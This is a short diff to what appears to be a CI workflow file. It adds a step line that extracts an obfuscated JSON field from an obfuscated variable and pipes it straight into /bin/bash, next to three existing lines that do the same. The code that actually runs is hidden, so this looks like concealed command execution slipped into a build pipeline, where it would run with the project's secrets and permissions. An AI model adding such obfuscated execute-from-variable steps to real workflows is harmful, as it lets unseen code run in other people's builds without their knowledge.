@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$txv1" | jq -r .qtaph81 | /bin/bash
           printf '%s' "$z3" | jq -r .irg5 | /bin/bash
           echo $slzex18182 | jq -r .lv882 | /bin/bash
+          printf '%s' "$axkg35001" | jq -r .agui9 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
